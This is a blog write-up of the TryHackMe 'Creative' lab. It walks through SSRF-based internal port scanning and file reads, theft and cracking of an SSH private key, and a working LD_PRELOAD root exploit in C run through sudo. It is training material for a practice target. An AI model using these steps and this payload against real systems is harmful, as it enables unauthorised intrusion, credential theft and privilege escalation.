<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Creative</title>
<meta name=description content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/posts/thm-creative/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Creative"><meta property="og:description" content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL …"><meta property="og:image" content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Creative"><meta name=twitter:description content="Platform: TryHackMe Link: Creative Level: Easy OS: Linux The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/thm-creative/"><meta property="twitter:url" content="https://scorpiosec.com/posts/thm-creative/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-Creative/Creative.svg"><link rel=canonical href=https://scorpiosec.com/posts/thm-creative/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/thm-creative/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Creative</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>April 17, 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=https://tryhackme.com/r/room/creative>Creative</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p>The challenge begins with a static website that is unexploitable. Through subdomain enumeration, a URL testing application is uncovered, susceptible to SSRF. However, full exploitation is only possible after discovering an internally exposed port. This access allows for file reading on the server, leading to the retrieval of an SSH private key. Yet, this alone isn&rsquo;t enough to establish a foothold. Success is achieved by cracking the obtained SSH key&rsquo;s hash, granting access to the target system. Finally, privilege escalation is done by exploiting the <code>LD_PRELOAD</code> environment variable.</p><p>Target IP - <code>10.10.119.61</code></p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Creative 10.10.119.61
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-04-12 20:52 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.119.61
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.27s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> filtered tcp ports <span style=color:#56b6c2>(</span>no-response<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://creative.thm
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 40.97 seconds
</span></span></code></pre></div><p>We have two ports open, 22 (SSH) and 80 (Nginx). We are redirected to <code>http://creative.thm</code>.</p><pre tabindex=0><code>sudo echo &#34;10.10.119.61 creative.thm&#34; | sudo tee -a /etc/hosts
</code></pre><h2 id=enumeration>Enumeration</h2><p>The website appears to be rather simple, without anything exploitable.</p><p>Directory enumeration and source code review do not yield anything.</p><p>Using ffuf for subdomain enumeration we find <code>beta</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fc 404 -t 100 -u http://creative.thm -H &#34;Host: FUZZ.creative.thm&#34; -ic -fs 178
</code></pre><p><img src=/images/THM-Creative/beta-subdomain.png alt="Beta subdomain found"></p><p>After adding it to the <code>/etc/hosts</code> file, we visit it and it turns out to be a URL tester.</p><p><img src=/images/THM-Creative/beta-url-tester.png alt="URL tester website"></p><p>Submitting <code>http://127.0.0.1:80</code> brings back the content of the main page without the styling, hinting to SSRF.</p><p><img src=/images/THM-Creative/url-test.png alt="URL tester SSRF 1"></p><p>Trying <code>http://creative.thm/etc/passwd</code> does not work. and returns <code>Dead</code>.</p><p><img src=/images/THM-Creative/file-read-fail.png alt="File read attempt failed"></p><h3 id=ssrf-internal-port-scanning>SSRF Internal Port Scanning</h3><p>Let&rsquo;s try to discover the internal open ports on the target.</p><pre tabindex=0><code>ffuf -u &#39;http://beta.creative.thm/&#39; -d &#34;url=http://127.0.0.1:FUZZ/&#34; -w &lt;(seq 1 65535) -H &#39;Content-Type: application/x-www-form-urlencoded&#39; -mc all -t 100 -fs 13
</code></pre><p><img src=/images/THM-Creative/ffuf-cmd.png alt="Internal ports fuzzing"></p><p>Port <code>1337</code> is discovered, by submitting <code>http://127.0.0.1:1337/</code> we are able to list the directories on the server.</p><p><img src=/images/THM-Creative/server-directories.png alt="Directories on the server"></p><p>In Burp we explore the file system and see what we can find. Let&rsquo;s go to <code>/home</code>.</p><p><img src=/images/THM-Creative/home-dir.png alt="Home directory via SSRF"></p><p>In <code>/home</code> we find a directory for <code>saad</code>. Going deeper with <code>http://127.0.0.1:1337/home/saad/</code> we discover the <code>.shh</code> folder and the user flag <code>user.txt</code>.</p><p>Using <code>http://127.0.0.1:1337/home/saad/user.txt</code> will reveal the flag.</p><h2 id=initial-foothold>Initial Foothold</h2><p>By submitting <code>http://127.0.0.1:1337/home/saad/.ssh/id_rsa</code> we can grab the SSH key of the user.</p><p><img src=/images/THM-Creative/saad-ssh-key.png alt="saad user SSH key"></p><blockquote><p>Don&rsquo;t forget to set the correct permissions on the key with <code>chmod 600</code>.</p></blockquote><p>Attempting to log in via SSH fails because we still need the passphrase of the user.</p><pre tabindex=0><code>ssh saad@creative.thm -i id_rsa
</code></pre><p><img src=/images/THM-Creative/ssh-fail.png alt="SSH login failed"></p><p>We can use <code>john</code> to find the passphrase by converting the key into a crackable hash.</p><pre tabindex=0><code>ssh2john id_rsa &gt; hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre><p><img src=/images/THM-Creative/passphrase.png alt="Hash cracking to recover passphrase"></p><p>The passphrase is found and we can now login.</p><p><img src=/images/THM-Creative/foothold.png alt="Initial foothold via SSH login"></p><h2 id=privilege-escalation>Privilege Escalation</h2><p>One of the things we should always check is the <code>.bash_history</code> file. It reveals the account password for <code>saad</code>.</p><p><img src=/images/THM-Creative/system-password.png alt="Account password recovered"></p><p>With that password we are able to run <code>sudo -l</code>. The user is able to run <code>/usr/bin/ping</code> as root.</p><p><img src=/images/THM-Creative/sudo-l.png alt="Sudo -l command"></p><p>There is not much we can do with <code>ping</code>. We could try to replace the binary with a malicious one if we had write permissions to <code>/usr/bin/</code> but that is not the case, all the files are owned by root.</p><p><img src=/images/THM-Creative/ping-binary.png alt="Ping binary permissions"></p><p>Our next lead is the environment variable <code>LD_PRELOAD</code>.</p><blockquote><p>The <code>env_keep+=LD_PRELOAD</code> entry in the sudo configuration suggests that <code>saad</code> is allowed to preserve the <code>LD_PRELOAD</code> environment variable when running sudo commands. This could potentially be leveraged for loading malicious shared libraries.</p></blockquote><p><code>LD_PRELOAD</code> is an environment variable in Linux and other Unix-like operating systems. It allows a user to specify a list of additional shared libraries to preload before all others when a program is executed.</p><p>A great article about <code>Linux Privilege Escalation using LD_Preload</code> is available <a href=https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/>here</a>.</p><ol><li>We go to <code>/tmp</code> and create a <code>shell.c</code> file.</li></ol><pre tabindex=0><code>cd /tmp
nano shell.c 
</code></pre><p>Here is the content of my file, I modified the one from the article because I was having issues during the compilation.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;stdio.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;unistd.h&gt; // Include this header for setuid() and setgid() functions</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e>#include</span> <span style=color:#7f848e>&lt;stdlib.h&gt;</span><span style=color:#7f848e>
</span></span></span><span style=display:flex><span><span style=color:#7f848e></span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>void</span> <span style=color:#61afef;font-weight:700>_init</span>() 
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>unsetenv</span>(<span style=color:#98c379>&#34;LD_PRELOAD&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>setgid</span>(<span style=color:#d19a66>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>setuid</span>(<span style=color:#d19a66>0</span>);
</span></span><span style=display:flex><span>    <span style=color:#61afef;font-weight:700>system</span>(<span style=color:#98c379>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><ol start=2><li>We compile and link <code>shell.c</code> into a shared library named <code>shell.so</code></li></ol><pre tabindex=0><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</code></pre><p><img src=/images/THM-Creative/shared-library.png alt="Shared library permissions"></p><ol start=3><li>Finally we execute the <code>ping</code> command with the <code>LD_PRELOAD</code> environment variable set to <code>/tmp/shell.so</code> and we get to root.</li></ol><pre tabindex=0><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
</code></pre><p><img src=/images/THM-Creative/root-flag.png alt="Privilege escalation and root flag"></p><p>This was a pretty straightforward challenge, showing how one vulnerability can lead to an exploitation chain. The challenge also highlighted how misconfigurations can be used to an attacker&rsquo;s advantage. Until the next one, keep learning!</p></div><div class=prev-next><div class=next-post><p><a href=/posts/htb-surveillance/>Next:
HTB: Surveillance
&#8594;</a></p><p class=next-post-date>April 19, 2024</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a><ul><li><a href=#ssrf-internal-port-scanning>SSRF Internal Port Scanning</a></li></ul></li><li><a href=#initial-foothold>Initial Foothold</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2024 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>